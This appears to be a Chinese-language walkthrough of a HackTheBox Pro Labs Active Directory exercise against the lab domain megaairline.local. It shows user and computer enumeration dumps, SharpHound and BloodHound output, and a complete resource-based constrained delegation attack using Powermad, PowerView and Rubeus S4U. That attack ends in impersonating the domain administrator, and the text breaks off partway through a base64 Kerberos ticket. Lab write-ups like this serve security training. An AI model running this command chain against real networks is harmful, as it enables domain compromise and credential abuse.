samaccounttype         : USER_OBJECT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 10/10/2020 3:46:25 PM
instancetype           : 4
objectguid             : 03d6ccde-96c1-4003-aa2a-0a3dd10e3cc8
lastlogon              : 12/31/1600 4:00:00 PM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=megaairline,DC=local
dscorepropagationdata  : {10/10/2020 3:47:20 PM, 1/1/1601 12:00:01 AM}
memberof               : CN=Guests,CN=Builtin,DC=megaairline,DC=local
whencreated            : 10/10/2020 3:46:25 PM
badpwdcount            : 0
cn                     : Guest
useraccountcontrol     : ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated             : 8197
primarygroupid         : 514
iscriticalsystemobject : True
usnchanged             : 8197

logoncount                    : 0
badpasswordtime               : 12/31/1600 4:00:00 PM
description                   : Key Distribution Center Service Account
distinguishedname             : CN=krbtgt,CN=Users,DC=megaairline,DC=local
objectclass                   : {top, person, organizationalPerson, user}
name                          : krbtgt
primarygroupid                : 513
objectsid                     : S-1-5-21-775547830-308377188-957446042-502
samaccountname                : krbtgt
admincount                    : 1
codepage                      : 0
samaccounttype                : USER_OBJECT
showinadvancedviewonly        : True
accountexpires                : NEVER
cn                            : krbtgt
whenchanged                   : 10/10/2020 4:02:29 PM
instancetype                  : 4
objectguid                    : 1baa5163-950d-4fbd-9065-b1fa6ff9d58c
lastlogon                     : 12/31/1600 4:00:00 PM
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=megaairline,DC=local
dscorepropagationdata         : {10/10/2020 4:02:29 PM, 10/10/2020 3:47:20 PM, 1/1/1601 12:04:16 AM}
serviceprincipalname          : kadmin/changepw
memberof                      : CN=Denied RODC Password Replication Group,CN=Users,DC=megaairline,DC=local
whencreated                   : 10/10/2020 3:47:19 PM
iscriticalsystemobject        : True
badpwdcount                   : 0
useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNT
usncreated                    : 12324
countrycode                   : 0
pwdlastset                    : 10/10/2020 8:47:19 AM
msds-supportedencryptiontypes : 0
usnchanged                    : 12786

logoncount                    : 90
badpasswordtime               : 3/25/2026 5:52:39 AM
distinguishedname             : CN=Elliot Alderson,CN=Users,DC=megaairline,DC=local
objectclass                   : {top, person, organizationalPerson, user}
displayname                   : Elliot Alderson
lastlogontimestamp            : 3/25/2026 3:02:14 AM
userprincipalname             : elliot@megaairline.local
name                          : Elliot Alderson
objectsid                     : S-1-5-21-775547830-308377188-957446042-1108
samaccountname                : elliot
logonhours                    : {255, 255, 255, 255...}
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : 12/31/1600 4:00:00 PM
countrycode                   : 0
whenchanged                   : 3/25/2026 10:02:14 AM
instancetype                  : 4
usncreated                    : 12983
objectguid                    : b5095ad3-4a5a-4bec-9172-017ff87dd778
sn                            : Alderson
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=megaairline,DC=local
dscorepropagationdata         : {12/22/2020 1:02:39 AM, 10/10/2020 5:53:35 PM, 1/1/1601 12:00:00 AM}
givenname                     : Elliot
lastlogon                     : 3/25/2026 4:14:46 AM
badpwdcount                   : 4
cn                            : Elliot Alderson
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated                   : 10/10/2020 5:53:35 PM
primarygroupid                : 513
pwdlastset                    : 10/13/2020 3:29:32 PM
msds-supportedencryptiontypes : 0
usnchanged                    : 172174

logoncount            : 2
badpasswordtime       : 12/31/1600 4:00:00 PM
description           : Contractor
distinguishedname     : CN=Anna Nyquist,CN=Users,DC=megaairline,DC=local
objectclass           : {top, person, organizationalPerson, user}
displayname           : Anna Nyquist
lastlogontimestamp    : 3/25/2026 6:28:59 AM
userprincipalname     : anna@megaairline.local
userworkstations      : dc2
name                  : Anna Nyquist
objectsid             : S-1-5-21-775547830-308377188-957446042-2101
samaccountname        : anna
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 3/25/2026 1:28:59 PM
instancetype          : 4
objectguid            : 1ade6025-06b3-40d9-a2ae-341c42dfe360
lastlogon             : 3/25/2026 6:28:59 AM
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=megaairline,DC=local
dscorepropagationdata : {10/14/2020 2:49:29 PM, 1/1/1601 12:00:00 AM}
givenname             : Anna
whencreated           : 10/14/2020 2:49:29 PM
sn                    : Nyquist
badpwdcount           : 0
cn                    : Anna Nyquist
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated            : 36902
primarygroupid        : 513
pwdlastset            : 10/14/2020 7:49:29 AM
usnchanged            : 172243

logoncount            : 0
badpasswordtime       : 12/31/1600 4:00:00 PM
distinguishedname     : CN=Thomas Green,CN=Users,DC=megaairline,DC=local
objectclass           : {top, person, organizationalPerson, user}
displayname           : Thomas Green
userprincipalname     : thomas@megaairline.local
name                  : Thomas Green
objectsid             : S-1-5-21-775547830-308377188-957446042-2601
samaccountname        : thomas
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 10/16/2020 3:34:24 PM
instancetype          : 4
usncreated            : 45139
objectguid            : 9bfe3f67-6487-407f-8e1d-ad53372271e4
sn                    : Green
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=megaairline,DC=local
dscorepropagationdata : {10/16/2020 3:34:24 PM, 10/16/2020 3:30:00 PM, 1/1/1601 12:00:01 AM}
givenname             : Thomas
lastlogon             : 12/31/1600 4:00:00 PM
badpwdcount           : 0
cn                    : Thomas Green
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 10/16/2020 3:30:00 PM
primarygroupid        : 513
pwdlastset            : 10/16/2020 8:30:00 AM
usnchanged            : 45172

logoncount            : 0
badpasswordtime       : 12/31/1600 4:00:00 PM
distinguishedname     : CN=Pippa Mortimer,CN=Users,DC=megaairline,DC=local
objectclass           : {top, person, organizationalPerson, user}
displayname           : Pippa Mortimer
userprincipalname     : pippa@megaairline.local
name                  : Pippa Mortimer
objectsid             : S-1-5-21-775547830-308377188-957446042-2602
samaccountname        : pippa
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 10/16/2020 3:34:24 PM
instancetype          : 4
usncreated            : 45149
objectguid            : f4c1fd23-f601-4642-9f84-9b21d1fd46bb
sn                    : Mortimer
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=megaairline,DC=local
dscorepropagationdata : {10/16/2020 3:34:24 PM, 10/16/2020 3:31:53 PM, 1/1/1601 12:00:01 AM}
givenname             : Pippa
lastlogon             : 12/31/1600 4:00:00 PM
badpwdcount           : 0
cn                    : Pippa Mortimer
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 10/16/2020 3:31:53 PM
primarygroupid        : 513
pwdlastset            : 10/16/2020 8:31:53 AM
usnchanged            : 45173

logoncount            : 0
badpasswordtime       : 12/31/1600 4:00:00 PM
distinguishedname     : CN=Angela Ward,CN=Users,DC=megaairline,DC=local
objectclass           : {top, person, organizationalPerson, user}
displayname           : Angela Ward
userprincipalname     : angela@megaairline.local
name                  : Angela Ward
objectsid             : S-1-5-21-775547830-308377188-957446042-2603
samaccountname        : angela
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 10/16/2020 3:34:24 PM
instancetype          : 4
usncreated            : 45157
objectguid            : 5f149526-3635-4103-a1dd-fa04625fefb3
sn                    : Ward
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=megaairline,DC=local
dscorepropagationdata : {10/16/2020 3:34:24 PM, 10/16/2020 3:32:45 PM, 1/1/1601 12:00:01 AM}
givenname             : Angela
lastlogon             : 12/31/1600 4:00:00 PM
badpwdcount           : 0
cn                    : Angela Ward
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 10/16/2020 3:32:45 PM
primarygroupid        : 513
pwdlastset            : 10/16/2020 8:32:45 AM
usnchanged            : 45175

logoncount            : 0
badpasswordtime       : 12/31/1600 4:00:00 PM
distinguishedname     : CN=Nigel O'Dea,CN=Users,DC=megaairline,DC=local
objectclass           : {top, person, organizationalPerson, user}
displayname           : Nigel O'Dea
userprincipalname     : nigel@megaairline.local
name                  : Nigel O'Dea
objectsid             : S-1-5-21-775547830-308377188-957446042-2604
samaccountname        : nigel
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 10/16/2020 3:34:24 PM
instancetype          : 4
usncreated            : 45165
objectguid            : 28ffb8ff-72d4-4fcc-877e-b4d333e6b862
sn                    : O'Dea
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=megaairline,DC=local
dscorepropagationdata : {10/16/2020 3:34:24 PM, 10/16/2020 3:33:50 PM, 1/1/1601 12:00:01 AM}
givenname             : Nigel
lastlogon             : 12/31/1600 4:00:00 PM
badpwdcount           : 0
cn                    : Nigel O'Dea
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 10/16/2020 3:33:50 PM
primarygroupid        : 513
pwdlastset            : 10/16/2020 8:33:50 AM
usnchanged            : 45174

logoncount            : 0
badpasswordtime       : 12/31/1600 4:00:00 PM
distinguishedname     : CN=Kate Milton,CN=Users,DC=megaairline,DC=local
objectclass           : {top, person, organizationalPerson, user}
displayname           : Kate Milton
userprincipalname     : kate@megaairline.local
name                  : Kate Milton
objectsid             : S-1-5-21-775547830-308377188-957446042-2605
samaccountname        : kate
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 10/16/2020 3:35:15 PM
instancetype          : 4
usncreated            : 45177
objectguid            : 75f5da4a-e78f-4d4d-8b44-7a511f11e8b1
sn                    : Milton
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=megaairline,DC=local
dscorepropagationdata : {10/16/2020 3:35:15 PM, 1/1/1601 12:00:00 AM}
givenname             : Kate
lastlogon             : 12/31/1600 4:00:00 PM
badpwdcount           : 0
cn                    : Kate Milton
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 10/16/2020 3:35:15 PM
primarygroupid        : 513
pwdlastset            : 10/16/2020 8:35:15 AM
usnchanged            : 45183

logoncount            : 0
badpasswordtime       : 12/31/1600 4:00:00 PM
distinguishedname     : CN=Emily Stone,CN=Users,DC=megaairline,DC=local
objectclass           : {top, person, organizationalPerson, user}
displayname           : Emily Stone
userprincipalname     : emily@megaairline.local
name                  : Emily Stone
objectsid             : S-1-5-21-775547830-308377188-957446042-2606
samaccountname        : emily
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 10/16/2020 3:36:37 PM
instancetype          : 4
usncreated            : 45185
objectguid            : 8e809a7f-6b4a6-4d64-8fc3-8f661448844e
sn                    : Stone
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=megaairline,DC=local
dscorepropagationdata : {10/16/2020 3:36:37 PM, 1/1/1601 12:00:00 AM}
givenname             : Emily
lastlogon             : 12/31/1600 4:00:00 PM
badpwdcount           : 0
cn                    : Emily Stone
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 10/16/2020 3:36:37 PM
primarygroupid        : 513
pwdlastset            : 10/16/2020 8:36:37 AM
usnchanged            : 45192
```

###  枚举域计算机
```bash


pwdlastset                    : 9/17/2024 4:32:55 AM
logoncount                    : 279
msds-generationid             : {187, 21, 237, 37...}
serverreferencebl             : CN=DC2,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megaairline,D
                                C=local
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=DC2,OU=Domain Controllers,DC=megaairline,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 3/24/2026 9:00:37 PM
name                          : DC2
objectsid                     : S-1-5-21-775547830-308377188-957446042-1000
samaccountname                : DC2$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 3/25/2026 4:00:37 AM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2019 Standard
instancetype                  : 4
msdfsr-computerreferencebl    : CN=DC2,CN=Topology,CN=Domain System 
                                Volume,CN=DFSR-GlobalSettings,CN=System,DC=megaairline,DC=local
objectguid                    : 3801702c-5ca9-4a0a-8684-7378ff5d5bfa
operatingsystemversion        : 10.0 (17763)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=megaairline,DC=local
dscorepropagationdata         : {12/22/2020 4:56:37 PM, 10/14/2020 2:51:26 PM, 10/10/2020 3:47:20 PM, 1/1/1601 6:12:17 
                                PM}
serviceprincipalname          : {Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC2.megaairline.local, 
                                ldap/DC2.megaairline.local/ForestDnsZones.megaairline.local, 
                                ldap/DC2.megaairline.local/DomainDnsZones.megaairline.local, 
                                DNS/DC2.megaairline.local...}
usncreated                    : 12293
lastlogon                     : 3/25/2026 5:00:12 AM
badpwdcount                   : 0
cn                            : DC2
useraccountcontrol            : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
whencreated                   : 10/10/2020 3:47:19 PM
primarygroupid                : 516
iscriticalsystemobject        : True
msds-supportedencryptiontypes : 28
usnchanged                    : 172084
ridsetreferences              : CN=RID Set,CN=DC2,OU=Domain Controllers,DC=megaairline,DC=local
dnshostname                   : DC2.megaairline.local

logoncount                    : 297
badpasswordtime               : 4/2/2021 6:10:29 AM
distinguishedname             : CN=MS01,CN=Computers,DC=megaairline,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
badpwdcount                   : 0
lastlogontimestamp            : 3/24/2026 9:00:41 PM
objectsid                     : S-1-5-21-775547830-308377188-957446042-1106
samaccountname                : MS01$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
countrycode                   : 0
cn                            : MS01
accountexpires                : NEVER
whenchanged                   : 3/25/2026 4:00:41 AM
instancetype                  : 4
usncreated                    : 12897
objectguid                    : eaef63ab-f76e-40d7-8c40-34efdb1cb220
operatingsystem               : Windows Server 2019 Standard
operatingsystemversion        : 10.0 (17763)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=megaairline,DC=local
dscorepropagationdata         : 1/1/1601 12:00:00 AM
serviceprincipalname          : {tapinego/MS01, tapinego/MS01.megaairline.local, WSMAN/MS01, 
                                WSMAN/MS01.megaairline.local...}
lastlogon                     : 3/25/2026 6:31:31 AM
iscriticalsystemobject        : False
usnchanged                    : 172091
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT
whencreated                   : 10/10/2020 5:29:22 PM
primarygroupid                : 515
pwdlastset                    : 9/17/2024 4:47:23 AM
msds-supportedencryptiontypes : 28
name                          : MS01
dnshostname                   : MS01.megaairline.local

```

### 枚举域管理员
```bash
GroupDomain             : megaairline.local
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=megaairline,DC=local
MemberDomain            : megaairline.local
MemberName              : Administrator
MemberDistinguishedName : CN=Administrator,CN=Users,DC=megaairline,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-775547830-308377188-957446042-500
```

## sharphound
> 直接在rdp上拖拽压缩包即可
>

### 运行
```bash
.\SharpHound.exe -d megaairline.local --domaincontroller dc2.megaairline.local -c All
```

### 下载
```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> download 20260325064431_BloodHound.zip
                                        
Info: Downloading C:\Users\Administrator\Documents\20260325064431_BloodHound.zip to 20260325064431_BloodHound.zip                                                                                               
                                        
Info: Download successful!
```

## bloodhound
> 1. ANNA@MEGAAIRLINE.LOCAL可以对DC2.MEGAAIRLINE.LOCAL或者DOMAIN CONTROLLERS@MEGAAIRLINE.LOCAL 具有GenericAll的权限
> 2. GenericAll 是 Active Directory 中的一个权限，它表示对对象的完全控制权限。在 Active Directory 中，GenericAll 是一种非常强大的权限，它允许用户对对象进行任何操作，包括修改对象的属性、添加或删除成员、设置权限等
>

## ![](/image/hackthebox-prolabs/Ascension-19.png)
## Powermad
> 用于创建机器账户
>

### 上传
```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload /home/kali/Desktop/tools/Powermad/Powermad.ps1
                                        
Info: Uploading /home/kali/Desktop/tools/Powermad/Powermad.ps1 to C:\Users\Administrator\Documents\Powermad.ps1                                                                                                 
                                        
Data: 180768 bytes of 180768 bytes copied
                                        
Info: Upload successful!
```

### 运行
> 作用：
>
> 导入 PowerMad 模块。
>
> 在域 megaairline.local 的域控制器 DC2 上创建一个名为 privesc 的计算机账户，密码为 Password123.。
>
> 输出：[+] Machine account privesc added，表示成功创建机器账户。
>
> 
>
> 目的：拥有一个可控的计算机账户，后续利用其进行基于资源的约束委派（Resource-Based Constrained Delegation，RBCD）
>

```bash
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount privesc -Password $(ConvertTo-SecureString 'Password123.' -AsPlainText -Force) -Domain megaairline.local -DomainController DC2.megaairline.local

[+] Machine account privesc added
```

#### 获取机器账户SUID
> 作用：通过 PowerView 的 Get-DomainComputer 获取名为 FakePC（应为 privesc）的计算机账户的 objectsid 属性。
>
> 注意：命令中的 FakePC 可能是笔误，实际应使用 privesc。该 SID 将用于后续的安全描述符构建。
>

```bash
PS C:\Users\elliot.MS01\Downloads> $FakeSID = (Get-DomainComputer FakePC -Domain megaairline.local -Server dc2.megaairline.local).objectsid
PS C:\Users\elliot.MS01\Downloads> echo $SID
S-1-5-21-775547830-308377188-957446042-11102
```

#### 构建安全描述符
> 作用：构造一个 RawSecurityDescriptor，其中包含一条 ACE，授予指定的 SID（即 privesc$ 账户）允许 代表其他用户请求服务的权限（这是基于资源的约束委派的关键配置）。
>
> 将安全描述符转换为二进制数组 $SDBytes。
>
> 通过 PowerView 的 Get-DomainComputer 获取 DC2 计算机对象，并使用 Set-DomainObject 将 msDS-AllowedToActOnBehalfOfOtherIdentity 属性设置为该二进制数据。
>
> 输出：VERBOSE 信息显示属性成功设置。
>
> 目的：允许 privesc$ 计算机账户模拟域内任意用户（如管理员）请求针对 DC2 的服务票据，这是实现 S4U2proxy 的前提
>

##### payload
```bash
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer DC2 -Domain megaairline.local -Server DC2.megaairline.local | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Domain megaairline.local -Server DC2.megaairline.local -Verbose
```

##### 返回
```bash
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC2.megaairline.local/DC=megaairline,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=DC2,OU=Domain
Controllers,DC=megaairline,DC=local)))
VERBOSE: [Set-DomainObject] Setting 'msds-allowedtoactonbehalfofotheridentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0
36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 182 235 57 46
100 118 97 18 154 119 17 57 94 43 0 0' for object 'DC2$'
```

## 获取 privesc$ 的 NTLM hash
> 作用：使用 Rubeus 计算密码 Password123. 的 NTLM 哈希（rc4_hmac）。
>
> 输出：rc4_hmac : FA7665BEFE243A5079D1C602F5524CE0。
>
> 目的：获得机器账户 privesc$ 的凭据哈希，用于后续 Kerberos 认证
>

```bash
PS C:\Users\elliot.MS01\Downloads> .\Rubeus.exe hash /password:Password123.

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : Password123.
[*]       rc4_hmac             : FA7665BEFE243A5079D1C602F5524CE0

[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!
```

## Rubeus 进行 S4U
> 目标：利用计算机账户 privesc$ 的 NTLM 哈希，通过 S4U2self + S4U2proxy 模拟域管理员 administrator，获取 CIFS 服务的 Kerberos 票据并导入当前会话
>
> 输出解析：
>
> + 使用 rc4 哈希向 DC2 请求 TGT（Kerberos 身份认证）
> + 通过 S4U2self 获得 administrator 到自身服务的票据
> + 通过 S4U2proxy 将票据转换为 CIFS/DC2 的服务票据
> + /ptt 将票据导入当前会话，使得当前进程能够以 administrator 身份访问 DC2 的 CIFS 共享
>

```bash
PS C:\Users\elliot.MS01\Downloads> .\Rubeus.exe s4u /domain:megaairline.local /dc:DC2 /user:privesc$ /rc4:FA7665BEFE243A5079D1C602F5524CE0 /impersonateuser:administrator /msdsspn:CIFS/DC2.megaairline.local /ptt /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: S4U

[*] Using rc4_hmac hash: FA7665BEFE243A5079D1C602F5524CE0
[*] Building AS-REQ (w/ preauth) for: 'megaairline.local\privesc$'
[*] Using domain controller: 192.168.11.201:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFqDCCBaSgAwIBBaEDAgEWooIErjCCBKphggSmMIIEoqADAgEFoRMbEU1FR0FBSVJMSU5FLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxFtZWdhYWlybGluZS5sb2NhbKOCBFwwggRYoAMCARKhAwIBAqKCBEoEggRGcbRIoRgbXk1LKTlMfYPUxX1HdKvjJIejuMHsYj+VZlgp5izYRPzIDs0tQph9P6og5raPBIYXSyLQUywUBCMbd3j8FxIMw51I+6QWzneEWnUg3r+1yk3lI/FrA0ULTrHM6ww3ssQl7uzLZDcEp6qiz23/+Mb1B4tJwuLJmu8LlmeBJaYEJhf+aOTsTdM6BRkdb7FxEbzHVI3Trpxt7t/Sxtgfq02TdG+kAmENRsxOYVJRNOwkXClVgw1lbYbKuDuSfsW2o74cAAkeSk5+0M+KvH3IOliLhufiOqsO9d7BbpuXWaFDt20HPXVLxj7DEWL/Hg08xBZGgsP6h8aLBqjHlH7i7kNPxQVkN9yMBLnBKCHejMUgbZzIZMUuasKYQPFfwmjZXwmHl9tYFaXw6BRh0EmYfoGLmYJm/c7bo57iaKlX8t51k16PMqEGSbpqpv3vp0ixy6IeRKyIQ4KjoG67TZTBR7rQ7d1KZxOBWisgOQqxQbj0vYOp1ZCBw1J1XhHgU2qvvjEw1+YByPHf2VAhKPpA0mms5PlQvGJMmvUiJMeFqcf1rQn4nuqkajIcB8E1s0SqpRc5upADJPCxUbhn3L/NfhOj5ELsTseTVCB9gjUYTnVkwYaVk5wMHTkXzXcBZDVOJWEHuMlOk2tkvkMHdyoYNhHGtjlcrq4rU2mzEMwCvh6IRpRoMUTnso8knRZhUWmGYvLcWqgCBSdbcgBYzekNI+c3EdrDdXo5jUkjg15amp8sRAVXR5cjJXZbkAzqUoaV6wc51qmApP7Kj7ZrvhIMaoNgC5Dn6Bhu+2XQQyMh4o9loioV4Lh5VWu/4G2ErFzUXdv7riahvMdoo+312E59dL4aIhN3hn8Xg3MH4aTHnQzvpCdh9KC9oqim4Nxt1isLNX+tCbHXYOI/cy+PmUyCSUZsu6AejOttHX60nH/P9jWSrvvbyTRYfy4K46UNSn5NTT+bX1qF9jEhHhUroQhXvY5ornm+uKDjHMMQr7H23oVJn3JLJImNw4FQF6kvU1dpIIeBtgf3gijQ1GvdA9rbk3oB6bU5dc1RsXsie8kTnBFwlmaGaIX7oHR5EEa8fxF106RXwx6mW8FN7FQ7g8tButO83SVLCdL7wf7HTHVeIBQIv6TCYGfqbHVI5RsFK+XHgwlfdyHHSq2FOc6zpd3fsYiZTsDJcQCksr5otaqdIz4S+P/Xzc/hYEuVdwUMbRum9K73olr8kVselrIgMxqiO1Egm96GZybVTTzPoQTYU6RNO1dlFm8WRoP/+xu0mqin8tgKTq+rUDkgyeraRwN7EbJr9H1pPPRFct8jKQ33kt5nbWALA0MGvRZSjVdBvGBmFo9I8byAZrXBX9KtsBtl7KCa1OkvpGI3ptegSEp6wS7XYvJS+SPqxv70cfvROIf+w4uVAZUpCCZeKDE1HmgFBWlIH976LIzJ3s2DDqIaawrDGSKjgeUwgeKgAwIBAKKB2gSB132B1DCB0aCBzjCByzCByKAbMBmgAwIBF6ESBBAX2kFwoQI/pI7p325BCrAJoRMbEU1FR0FBSVJMSU5FLkxPQ0FMohUwE6ADAgEBoQwwChsIcHJpdmVzYySjBwMFAEDhAAClERgPMjAyNjAzMjUxNTQ1NTNaphEYDzIwMjYwMzI2MDE0NTUzWqcRGA8yMDI2MDQwMTE1NDU1M1qoExsRTUVHQUFJUkxJTkUuTE9DQUypJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEW1lZ2FhaXJsaW5lLmxvY2Fs


[*] Action: S4U

[*] Building S4U2self request for: 'privesc$@MEGAAIRLINE.LOCAL'
[*] Using domain controller: DC2 (192.168.11.201)
[*] Sending S4U2self request to 192.168.11.201:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'privesc$@MEGAAIRLINE.LOCAL'
[*] base64(ticket.kirbi):

      doIGJDCCBiCgAwIBBaEDAgEWooIFJjCCBSJhggUeMIIFGqADAgEFoRMbEU1FR0FBSVJMSU5FLkxPQ0FMohUwE6ADAgEBoQwwChsIcHJpdmVzYySjggTlMIIE4aADAgEXoQMCAQGiggTTBIIEz5un8dmVR0Nr22UY+cr4aHqkpdAe9wpCJtZ8UIUxX3VZ5i/ZaCiFG+UKKckieEUGdGfR0myt0ADdOY9zueLv1dbWNA8rw/aF48dp9j9e6Y+ykpsrx3CJDhJhf7m/USQS74WuqSwTF12NWLCMDKHSYQiOarSG8ACs7fNPEDIGVJucLTPUN2X0Hq9e1zOCk8yMHzH0ETlXEumpzCkpGt6R/zmLH3BJU864jSWzrHC0ret9Ip1RB7hOGHXBjnTbyQuEcsed2Et0bR483v7MRvPDbqTywrjSA9MwLUNjdFBWNcjffiiGh12QR3J/yH2KOuX66Yy+NtgDGQZNe9ZmDLeeONzQGSk7YoMToyCruo8uUjawpnlh3LlNtBZWvy5gTeITw6LUNP+8i8YmQeqmQmdtoQ3ErJv8EbrtK2mmk2H129n3BCHOqb93T0in3ZUl2emtNR30HAGjjV9+yNpnePmNuMu0NIwxslH/j91YZYE8EAGqx3ylAlS1lacPz/oueN2yJtgXzj5EhDyJbhrsISNgXgCTcyek8SMZriFGnDhUig2XalIrvHLqDY3QEsNjf4fVSPpfXF/n2X03qVe8SzWEbCQQ4CsIF3vDRVeP0TfXScKDOx7WHLJzp2vWt87cgKfgaoNqD2WNOgynd/vvGg4OWCdKz8PsowWarIdGPDvn58rt96V2x9xUT7ZcqxLfqYIjfLB7tsaTlDLucDhIUGi4H/BMKLkr8EHUfDZm3XrWEnb0n9ZYQKI4kwYMT6fRtj/rWxS799vzS2TUfKIFJG6NwayhpoT7o1KjRcJpLsCBIVGaapkjKYl8qTvPMk7yrUtVAFJT6yJAQxytZp1hhg3J3yx1AWE7RZSHRZPCWKIgu4qijFuq4TJanWKdZKBjpMqVGEkwN+yZ/AdRw6BOKxH99M/gC3Fm1m8RUndlBUXYyO5+1L0jZjs64xaROFqtPXoJhizNV/sw1jYkQKr4J4fTeU8HoECpzfBs+BB0SlwuLb82IEmRXGLhQ4T6S8XH7+9yEScVbX6hHdXN44dlmltG484n8qH2aocGLOt3NyDLKgo3CQyoOPP/HMnhix+8znBTq4TGug0WcV54zYtWYoZtbcnQPAQ2lVkycIyvQKrgZe8lHjE7oi2tSUmKfd1Br6eu00wggu9FqnKLa/UWQWQQsfX7TdqpvWBLJOIRFnpSnPxvoxGBfcjKIelcuWopy820+j492/Lry+trdfUl6vkLv2owJPHeddI2MH8C7MM/FCMirsO2hsudEZxPZbPNfHNR+4mjOmGwgbG3wFBFZQ3T7mVSjHOP7Z6XAsjvql+m+Xxfd/rgLbUNGGbya1wM16jrJmtt9fJ4P9+jcs1F8+r7JSed6XwzW8mpVWbZjZsJUvob33QLgncvNMaubPen51E3f6O6z15PvIByWWoGa9WchB6/oA1/lMmxkiZTYViY5gyDty6HUim4Y3bi6vZOTBT+ojftKKK5be20KCfYMMOqyRI0jfPxvewb4P/MHETzD/RjbXpWzK7zh6ntxF2DwE7WIliyXMDFlM5KlzrEfWOeS3FIfflQ+s/QmWEySmUVh3AnRfDFLR0TgGVIFRzcZSr5Vpb7Hd5goWLT3ROITQTD6hwjE